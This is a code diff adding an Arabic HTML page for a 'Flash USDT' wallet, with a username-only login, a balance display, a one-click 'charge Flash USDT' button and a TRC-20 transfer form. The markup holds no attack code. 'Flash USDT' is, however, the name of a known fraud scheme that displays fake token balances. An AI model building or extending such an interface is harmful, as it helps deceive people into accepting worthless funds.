@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <title>محفظة Flash USDT</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>محفظة Flash USDT</h1>
+    <div id="auth">
+      <input type="text" id="username" placeholder="اسم المستخدم" />
+      <button onclick="login()">دخول</button>
+    </div>
+
+    <div id="wallet" style="display: none;">
+      <p>مرحباً، <span id="userDisplay"></span></p>
+      <p>العنوان: <span id="walletAddress"></span></p>
+      <p>الرصيد: <span id="balance">0</span> USDT</p>
+
+      <button onclick="charge()">شحن Flash USDT</button>
+
+      <h3>تحويل</h3>
+      <input type="text" id="toAddress" placeholder="عنوان TRC-20" />
+      <input type="number" id="amount" placeholder="المبلغ" />
+      <button onclick="transfer()">تحويل</button>
+
+      <h3>السجل</h3>
+      <ul id="history"></ul>
+
+      <button onclick="logout()" class="logout">تسجيل خروج</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
